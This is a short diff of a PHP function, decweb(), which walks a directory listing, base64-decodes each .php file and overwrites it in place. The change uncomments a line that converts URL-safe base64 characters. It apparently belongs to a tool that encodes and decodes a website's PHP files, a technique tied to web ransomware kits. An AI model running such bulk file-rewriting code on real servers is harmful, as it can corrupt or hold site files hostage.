@@ -58,7 +58,7 @@ function decweb() {
 		$cfile = array_reverse($cfile);
 		if ((string)$cfile[0] == 'php') { 
 			$decryptfile = file_get_contents($dirlist[$i]);
-			#$decryptfile = strtr($decryptfile, array('-' => '+', '_' => '/'));
+			$decryptfile = strtr($decryptfile, array('-' => '+', '_' => '/'));
 			$decrypted = base64_decode($decryptfile);
 			$fp = fopen($dirlist[$i], 'r+');
 			fwrite($fp, $decrypted);
